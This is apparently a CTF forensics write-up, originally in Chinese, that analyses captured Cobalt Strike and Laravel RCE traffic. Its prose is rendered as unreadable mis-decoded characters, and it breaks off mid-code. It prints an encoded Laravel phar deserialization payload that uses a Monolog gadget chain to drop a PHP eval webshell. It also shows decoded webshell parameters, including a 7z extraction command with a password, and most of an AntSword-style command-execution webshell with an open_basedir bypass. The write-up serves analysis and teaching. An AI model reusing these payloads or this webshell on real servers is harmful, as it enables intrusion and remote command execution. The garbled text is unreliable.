strikeæœ‰å…³ï¼ˆrtåºŸç‰©ç‹‚å–œï¼‰ï¼Œç„¶åæœäº†ä¸‹.cobaltstrike.beacon_keysè¿™ä¸ªä¸œè¥¿æ˜¯å¹²å˜›çš„ã€‚ä¸Šè¿°æ–‡ä»¶æ˜¯ä¸€ä¸ªåºåˆ—åŒ–åçš„å…¬é’¥ç§é’¥æ–‡ä»¶ï¼ŒCSçš„beaconä¼šåµŒå…¥è¿™ä¸ªæ–‡ä»¶ä¸­çš„å…¬é’¥ï¼Œå½“ç„¶äº†ï¼Œç§é’¥æ˜¯ç•™ç»™serverè‡ªå·±çš„ã€‚ä¸‹ä¸€æ­¥åº”è¯¥æ˜¯å¯¹è¿™ä¸ªæ–‡ä»¶è¿›è¡Œè§£å¯†ï¼Œè·å–CSçš„é€šä¿¡æ•°æ®ã€‚æ—¢ç„¶çŸ¥é“äº†æ˜¯cobalt strikeçš„é€šä¿¡æµé‡ï¼Œé‚£ä¹ˆéœ€è¦æ‰¾åˆ°beaconä¸teamserveräº¤äº’çš„æ•°æ®åŒ…ï¼Œä½†è¿™ä¸ªå‰ææ˜¯å¾—åˆ°ç§é’¥ã€‚è·å–ç§é’¥çš„å‰ææ˜¯è§£å¼€å‹ç¼©åŒ…çš„å¯†ç ã€‚ä¸‹é¢éœ€è¦åšçš„æ˜¯æ‰¾å‹ç¼©åŒ…çš„å¯†ç ã€‚<img src="http://cdn.polowong.top/163357529132181rdbcyd.png?imageslim" alt="paste image">ç»§ç»­è¿½è¸ªæ•°æ®åŒ…ï¼Œåœ¨ä¸Šé¢çš„åŒ…ä¸­çœ‹åˆ°äº†è§£å‹çš„æ“ä½œã€‚ä½†æ˜¯å½“æ—¶æˆ‘ç›´æ¥å¯¹ä¼ è¾“çš„æ•°æ®è¿›è¡ŒURL+BASE64è§£ç ï¼Œå¹¶ä¸èƒ½å¾—åˆ°ä»»ä½•æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥éœ€è¦åšçš„æ˜¯çœ‹ä¸€çœ‹ä¼ çš„é©¬çš„å†…å®¹ä»¥åŠåŠ å¯†æ–¹å¼ã€‚åœ¨laravel RCEçš„åŒ…ä¸­å¯ä»¥æ‰¾åˆ°payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P&#x3D;00D&#x3D;009&#x3D;00w&#x3D;00a&#x3D;00H&#x3D;00A&#x3D;00g&#x3D;00X&#x3D;001&#x3D;009&#x3D;00I&#x3D;00Q&#x3D;00U&#x3D;00x&#x3D;00U&#x3D;00X&#x3D;000&#x3D;00N&#x3D;00P&#x3D;00T&#x3D;00V&#x3D;00B&#x3D;00J&#x3D;00T&#x3D;00E&#x3D;00V&#x3D;00S&#x3D;00K&#x3D;00C&#x3D;00k&#x3D;007&#x3D;00I&#x3D;00D&#x3D;008&#x3D;00+&#x3D;00D&#x3D;00Q&#x3D;00o&#x3D;00J&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00C&#x3D;00y&#x3D;00A&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00Y&#x3D;00T&#x3D;00o&#x3D;00y&#x3D;00O&#x3D;00n&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00T&#x3D;00z&#x3D;00o&#x3D;00z&#x3D;00M&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00T&#x3D;00W&#x3D;009&#x3D;00u&#x3D;00b&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00x&#x3D;00I&#x3D;00Y&#x3D;00W&#x3D;005&#x3D;00k&#x3D;00b&#x3D;00G&#x3D;00V&#x3D;00y&#x3D;00X&#x3D;00F&#x3D;00N&#x3D;005&#x3D;00c&#x3D;002&#x3D;00x&#x3D;00v&#x3D;00Z&#x3D;001&#x3D;00V&#x3D;00k&#x3D;00c&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;006&#x3D;00e&#x3D;003&#x3D;00M&#x3D;006&#x3D;00O&#x3D;00T&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00c&#x3D;002&#x3D;009&#x3D;00j&#x3D;00a&#x3D;002&#x3D;00V&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00P&#x3D;00O&#x3D;00j&#x3D;00I&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00J&#x3D;00N&#x3D;00b&#x3D;002&#x3D;005&#x3D;00v&#x3D;00b&#x3D;00G&#x3D;009&#x3D;00n&#x3D;00X&#x3D;00E&#x3D;00h&#x3D;00h&#x3D;00b&#x3D;00m&#x3D;00R&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00J&#x3D;00c&#x3D;00Q&#x3D;00n&#x3D;00V&#x3D;00m&#x3D;00Z&#x3D;00m&#x3D;00V&#x3D;00y&#x3D;00S&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00p&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;00x&#x3D;00M&#x3D;00D&#x3D;00o&#x3D;00i&#x3D;00A&#x3D;00C&#x3D;00o&#x3D;00A&#x3D;00a&#x3D;00G&#x3D;00F&#x3D;00u&#x3D;00Z&#x3D;00G&#x3D;00x&#x3D;00l&#x3D;00c&#x3D;00i&#x3D;00I&#x3D;007&#x3D;00c&#x3D;00j&#x3D;00o&#x3D;00z&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00l&#x3D;00N&#x3D;00p&#x3D;00e&#x3D;00m&#x3D;00U&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00k&#x3D;006&#x3D;00L&#x3D;00T&#x3D;00E&#x3D;007&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;005&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00i&#x3D;00d&#x3D;00W&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00X&#x3D;00I&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00c&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00V&#x3D;00j&#x3D;00a&#x3D;00G&#x3D;008&#x3D;00g&#x3D;00X&#x3D;00j&#x3D;00w&#x3D;00&#x2F;&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00E&#x3D;00B&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00F&#x3D;00s&#x3D;00K&#x3D;00E&#x3D;00B&#x3D;00n&#x3D;00e&#x3D;00m&#x3D;00l&#x3D;00u&#x3D;00Z&#x3D;00m&#x3D;00x&#x3D;00h&#x3D;00d&#x3D;00G&#x3D;00U&#x3D;00o&#x3D;00Y&#x3D;00m&#x3D;00F&#x3D;00z&#x3D;00Z&#x3D;00T&#x3D;00Y&#x3D;000&#x3D;00X&#x3D;002&#x3D;00R&#x3D;00l&#x3D;00Y&#x3D;002&#x3D;009&#x3D;00k&#x3D;00Z&#x3D;00S&#x3D;00g&#x3D;00k&#x3D;00X&#x3D;001&#x3D;00B&#x3D;00P&#x3D;00U&#x3D;001&#x3D;00R&#x3D;00b&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;000&#x3D;00M&#x3D;00z&#x3D;00N&#x3D;00d&#x3D;00K&#x3D;00S&#x3D;00k&#x3D;00p&#x3D;00O&#x3D;00z&#x3D;009&#x3D;00e&#x3D;00P&#x3D;00i&#x3D;00A&#x3D;00+&#x3D;00I&#x3D;00C&#x3D;005&#x3D;00j&#x3D;00b&#x3D;002&#x3D;005&#x3D;00m&#x3D;00a&#x3D;00W&#x3D;00c&#x3D;00u&#x3D;00c&#x3D;00G&#x3D;00h&#x3D;00w&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00U&#x3D;006&#x3D;00I&#x3D;00m&#x3D;00x&#x3D;00l&#x3D;00d&#x3D;00m&#x3D;00V&#x3D;00s&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00O&#x3D;00O&#x3D;003&#x3D;001&#x3D;009&#x3D;00c&#x3D;00z&#x3D;00o&#x3D;004&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00s&#x3D;00Z&#x3D;00X&#x3D;00Z&#x3D;00l&#x3D;00b&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00T&#x3D;00j&#x3D;00t&#x3D;00z&#x3D;00O&#x3D;00j&#x3D;00E&#x3D;000&#x3D;00O&#x3D;00i&#x3D;00I&#x3D;00A&#x3D;00K&#x3D;00g&#x3D;00B&#x3D;00p&#x3D;00b&#x3D;00m&#x3D;00l&#x3D;000&#x3D;00a&#x3D;00W&#x3D;00F&#x3D;00s&#x3D;00a&#x3D;00X&#x3D;00p&#x3D;00l&#x3D;00Z&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00Y&#x3D;00j&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00Q&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00G&#x3D;00J&#x3D;001&#x3D;00Z&#x3D;00m&#x3D;00Z&#x3D;00l&#x3D;00c&#x3D;00k&#x3D;00x&#x3D;00p&#x3D;00b&#x3D;00W&#x3D;00l&#x3D;000&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;00p&#x3D;00O&#x3D;00i&#x3D;000&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00M&#x3D;00T&#x3D;00M&#x3D;006&#x3D;00I&#x3D;00g&#x3D;00A&#x3D;00q&#x3D;00A&#x3D;00H&#x3D;00B&#x3D;00y&#x3D;00b&#x3D;002&#x3D;00N&#x3D;00l&#x3D;00c&#x3D;003&#x3D;00N&#x3D;00v&#x3D;00c&#x3D;00n&#x3D;00M&#x3D;00i&#x3D;00O&#x3D;002&#x3D;00E&#x3D;006&#x3D;00M&#x3D;00j&#x3D;00p&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00w&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00z&#x3D;00o&#x3D;00i&#x3D;00Y&#x3D;003&#x3D;00V&#x3D;00y&#x3D;00c&#x3D;00m&#x3D;00V&#x3D;00u&#x3D;00d&#x3D;00C&#x3D;00I&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;00x&#x3D;00O&#x3D;003&#x3D;00M&#x3D;006&#x3D;00N&#x3D;00j&#x3D;00o&#x3D;00i&#x3D;00c&#x3D;003&#x3D;00l&#x3D;00z&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00t&#x3D;00I&#x3D;00j&#x3D;00t&#x3D;009&#x3D;00f&#x3D;00X&#x3D;001&#x3D;00p&#x3D;00O&#x3D;00j&#x3D;00c&#x3D;007&#x3D;00a&#x3D;00T&#x3D;00o&#x3D;003&#x3D;00O&#x3D;003&#x3D;000&#x3D;00F&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00Z&#x3D;00H&#x3D;00V&#x3D;00t&#x3D;00b&#x3D;00X&#x3D;00k&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00I&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00C&#x3D;005&#x3D;000&#x3D;00e&#x3D;00H&#x3D;00Q&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00X&#x3D;00E&#x3D;00t&#x3D;00L&#x3D;00Y&#x3D;00Q&#x3D;00Q&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00M&#x3D;00f&#x3D;00n&#x3D;00&#x2F;&#x3D;00Y&#x3D;00t&#x3D;00g&#x3D;00E&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00B&#x3D;000&#x3D;00Z&#x3D;00X&#x3D;00N&#x3D;000&#x3D;00d&#x3D;00G&#x3D;00V&#x3D;00z&#x3D;00d&#x3D;00D&#x3D;00Z&#x3D;006&#x3D;00P&#x3D;00U&#x3D;00p&#x3D;00j&#x3D;00h&#x3D;00k&#x3D;00a&#x3D;00y&#x3D;00y&#x3D;00N&#x3D;00i&#x3D;00Q&#x3D;003&#x3D;00Y&#x3D;00w&#x3D;00m&#x3D;00f&#x3D;00p&#x3D;00c&#x3D;008&#x3D;00Q&#x3D;00J&#x3D;00n&#x3D;00s&#x3D;00A&#x3D;00g&#x3D;00A&#x3D;00A&#x3D;00A&#x3D;00E&#x3D;00d&#x3D;00C&#x3D;00T&#x3D;00U&#x3D;00I&#x3D;00&#x3D;00</span><br></pre></td></tr></table></figure><p>æŠŠpayloadä¸­çš„=00æ›¿æ¢ä¸ºç©ºç„¶åè§£base64å¯ä»¥å¾—åˆ°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php __HALT_COMPILER(); ?&gt;</span><br><span class="line">ï¿½a:2:&#123;i:7;O:32:&quot;Monolog\Handler\SyslogUdpHandler&quot;:1:&#123;s:9:&quot;*socket&quot;;O:29:&quot;Monolog\Handler\BufferHandler&quot;:7:&#123;s:10:&quot;*handler&quot;;r:3;s:13:&quot;*bufferSize&quot;;i:-1;s:9:&quot;*buffer&quot;;a:1:&#123;i:0;a:2:&#123;i:0;s:77:&quot;echo ^&lt;?php @eval(@gzinflate(base64_decode($_POST[14433])));?^&gt; &gt; .config.php&quot;;s:5:&quot;level&quot;;N;&#125;&#125;s:8:&quot;*level&quot;;N;s:14:&quot;*initialized&quot;;b:1;s:14:&quot;*bufferLimit&quot;;i:-1;s:13:&quot;*processors&quot;;a:2:&#123;i:0;s:7:&quot;current&quot;;i:1;s:6:&quot;system&quot;;&#125;&#125;&#125;i:7;i:7;&#125;dummy\KKa~Ø¶test.txt\KKa~Ø¶testtest6z&#x3D;Jcï¿½Fï¿½ï¿½ØİŒ&amp;~ï¿½&lt;@ï¿½ï¿½GBMB</span><br></pre></td></tr></table></figure><p>è¿™å†™è¿›å»çš„åº”è¯¥æ˜¯ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡ï¼Œåº”è¯¥æ˜¯å’Œlaravelçš„rceæœ‰å…³ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨ä¼ è¿›å»çš„å†…å®¹ã€‚@eval(@gzinflate(base64_decode($_POST[14433])));æ‰€ä»¥éœ€è¦åšgzipå’Œbase64çš„è§£ç æ‰å¯ä»¥æ˜ç™½æµé‡åŒ…ä¸­çš„å…·ä½“å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">14433&#x3D;c0gtS8zRcEivysxLy0ksSdVISixONTOJT0lNzk9J1VCJD&#x2F;APDomON6gwSDFJNUpJNUs2TEs0j9XU1LQGAA&#x3D;&#x3D;</span><br><span class="line">_0x0d4e2de6c1fa7&#x3D;jVZtT9tIEP5+v2JZWcRWTZy3o5Q9U6MqVSvRAxF0fCiV5dhrsodjW7sOgUv8329m&#x2F;ZYA1ysI5JmdeXbeZz2RCl&#x2F;xwqSRUHkSPPtcykwqahM6oBbz4MwvxJL7iViKwhxYzMjySEjXQ8171MxynvrzQHFgg4qIzUrEIhsjC9eRC99psOSm4c+m139Nr7&#x2F;T2afrr1c3&#x2F;uevF9M&#x2F;z79N6Q8NG0jp5pLf+2AJ3EUdtj11qF2jMQ&#x2F;OwcB8pRZmJW1rfFs9K7TEL&#x2F;gy90HUtCwWZ5IHYSNIAkUMAedgE9h34Anlr6UognkCZukDaxNmaSHSFWclM4ol+qhP+tTpxzyKhpR5yweEr061pwdeLBLu8yehCtUc7EJ54WJXxWvjvRc1iHa&#x2F;D7EzwrTAKHh7YbiDn+2dg6GoYcA7MNsdMEP8ocQ&#x2F;PIOYV6qAId69szb1vRVs+Z&#x2F;3UgeTLJe7Ns4hcg+gUzIWr9KwEFkK8eNpCMFcFdZG8mIlU4IEyOyIACNfFaa1MaovN5vrvGA0eArxsRhweBr5YcKDFEgeLjJCx8e0TyfxiFa0110GII3QZARCcQxZKAFEga9wEyvk88bIXfTneOJHPMwibqrVXBXgj391Obv5TuOT42E0&#x2F;jAZvh+MJhP6wx5BfRjq50qreB6Nx7+fjE7i8SBulHj6CEKu91PV+WQ8mI+Hg5PxSfBh3Kj+ahuEbgMX2QN7aLku5OgjPQrJHd0Yqryj9JQ6OxSW4RsqUAIQPTDYpFfnN19c2odUtCS1+vTUWSnpJFkYJI6ai3SXbsnuQH9UJPzDquKJ4v97C&#x2F;t06tyKNMrWyoFGhYYaj3Z5s2d1e3l7PNnhvTjWKg3jKltzOVvwJHEeh&#x2F;2Bw9AQbETo&#x2F;eLZrDMELYhf2Er8KU8wSXS73QYqESmHD2i4RrKbFJWCHhWPek6QFvXRAkbjKWj5ksOwDBvUB&#x2F;5cgVIXkUGalWVpSBdylJcwBsOSdo0SQwnEYGDU2WZTu5unMIlxLvmNgqKWnjW1LZGldfUwNJssNAx&#x2F;GeRmr5Bi2bN3GGBykSUYup6NAKysmths7mgnWGwdHsJwhBpIquGIjAOR+tV9Rlzrd+7IVaowH2qRhQ9YgsQI6&#x2F;B1ZUkGNhlaxHUJlCY5PMQg9Kp49iykTWTo3eMn2T3wtlstswxE0rOsBrCQCAgJiyCTDzAboRQdtaAWxB6aEj7IgUs+n1&#x2F;Mprh+imVOXIJ7ATrPfL0nbNILVM9ibQ1&#x2F;ufIvLi9cE5TJEyMlA2fImcYZnR0O9Xp7ZSsIt5RJA4quspJgYsgGHQCmNxy97w&#x2F;gd4hl0vwdzR+xfhvZerJ+DoBiZT0AwYFqyeyNUjQJJvcq1XGoKDStUYIoUAjGJpciLbpZWt9wI3E3lfv37aU0XEawUqDSQAb3zC+OLyhTDE7V6BCZjVd9ApaNUHW91mJ5oFSxkCst2BBvi+oSgyrlIQpXXnkdE23dV2hEvfoY3go1bKX8dyZSk&#x2F;6Gz4sXmjmuSFQ14hw2MVKo35NQKOsFZAK3vl65cd7ZEkN6sH9yezSYnCCkl4dJprgW279AZqHfXoIV6rUsvIlUvTYk7ln92ctFzntQrese1Ozo7QM4MUT20kaRfR&#x2F;+eGWm5raWvtIYvakx6jS8uPatgme79Ahp7VDNe+F+APXb1UdLYQpbuTeHitV2CCayld1ffgduPWG8MIGKagYb&#x2F;XT5jWK4127K1wQos3c7C6XIi76+qYfr3TXWR2dNPcEbIXMNfnQ2K6JLfNcwvLbvAvvo7BpG0HmSIFPxRmoq5Y4U35Wq+7Cra91ZkHqYC800rt3SAK7XNKHs02b2aBCiUQ7cgfWRoqAGKuFRQBkrw6CAVTZ9CnmuO9ng1qZ6P02vry+vT+ER2UdjIaffuFLBPccVwrq3G4sEsv4F</span><br><span class="line">b430b310838a93&#x3D;4g</span><br><span class="line">f861d394170244&#x3D;X4Y21k</span><br><span class="line">ufbd335828f30f&#x3D;0bY2QgL2QgIkQ6XFxwaHBzdHVkeV9wcm9cXFdXV1xcc2VjcmV0IiYiQzpcUHJvZ3JhbSBGaWxlc1w3LVppcFw3ei5leGUiIHggc2VjcmV0LnppcCAtcFA0VWs2cWtoNkd2cXdnM3kmZWNobyAzNzhkZjJjMjM0JmNkJmVjaG8gZmI3Zjhm</span><br></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯å¯¹è§£å‹åŒ…çš„urlè§£ç ï¼Œç„¶ågzip+base64è§£ç å°è¯•è¿˜åŸä»£ç å†…å®¹,å¯¹ä¸Šé¢çš„æ¯ä¸ªå‚æ•°è¿›è¡Œè§£å¯†!ä¸‹é¢è¿™ä¸ªåŒ…æ˜¯è§£å‹ç¼©çš„åŒ…çš„è§£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class="line">@set_time_limit(0);</span><br><span class="line">$opdir&#x3D;@ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if($opdir) &#123;</span><br><span class="line">$ocwd&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$oparr&#x3D;preg_split(&quot;&#x2F;;|:&#x2F;&quot;,$opdir);</span><br><span class="line">@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class="line">foreach($oparr as $item) &#123;</span><br><span class="line">if(!@is_writable($item)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">$tmdir&#x3D;$item.&quot;&#x2F;.fedd1&quot;;</span><br><span class="line">@mkdir($tmdir);</span><br><span class="line">if(!@file_exists($tmdir)) &#123;</span><br><span class="line">continue;</span><br><span class="line">&#125;</span><br><span class="line">@chdir($tmdir);</span><br><span class="line">@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">$cntarr&#x3D;@preg_split(&quot;&#x2F;\\\\|\&#x2F;&#x2F;&quot;,$tmdir);</span><br><span class="line">for ($i&#x3D;0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class="line">@chdir(&quot;..&quot;);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@ini_set(&quot;open_basedir&quot;,&quot;&#x2F;&quot;);</span><br><span class="line">@rmdir($tmdir);</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">return $out;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">function asoutput() &#123;</span><br><span class="line">$output&#x3D;ob_get_contents();</span><br><span class="line">ob_end_clean();</span><br><span class="line">echo &quot;36&quot;.&quot;4f2&quot;;</span><br><span class="line">echo @asenc($output);</span><br><span class="line">echo &quot;42&quot;.&quot;ff1&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">$p&#x3D;base64_decode(substr($_POST[&quot;f861d394170244&quot;],2));</span><br><span class="line">$s&#x3D;base64_decode(substr($_POST[&quot;ufbd335828f30f&quot;],2));</span><br><span class="line">$envstr&#x3D;@base64_decode(substr($_POST[&quot;b430b310838a93&quot;],2));</span><br><span class="line">$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c \&quot;&#123;$s&#125;\&quot;&quot;:&quot;&#x2F;c \&quot;&#123;$s&#125;\&quot;&quot;;</span><br><span class="line">if(substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;) &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">@putenv(&quot;PATH&#x3D;&quot;.getenv(&quot;PATH&quot;).&quot;;C:&#x2F;Windows&#x2F;system32;C:&#x2F;Windows&#x2F;SysWOW64;C:&#x2F;Windows;C:&#x2F;Windows&#x2F;System32&#x2F;WindowsPowerShell&#x2F;v1.0&#x2F;;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(!empty($envstr)) &#123;</span><br><span class="line">$envarr&#x3D;explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class="line">foreach($envarr as $v) &#123;</span><br><span class="line">if (!empty($v)) &#123;</span><br><span class="line">@putenv(str_replace(&quot;|||askey|||&quot;, &quot;&#x3D;&quot;, $v));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class="line">function fe($f) &#123;</span><br><span 